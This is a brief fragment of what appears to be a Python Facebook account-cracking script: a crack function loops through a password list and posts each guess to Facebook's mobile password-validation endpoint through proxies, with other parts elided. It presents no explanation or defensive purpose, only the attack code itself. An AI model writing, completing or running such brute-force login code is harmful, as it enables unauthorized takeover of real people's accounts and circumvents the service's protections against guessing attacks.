...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			bx = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=date, headers=head,proxies=proxy)
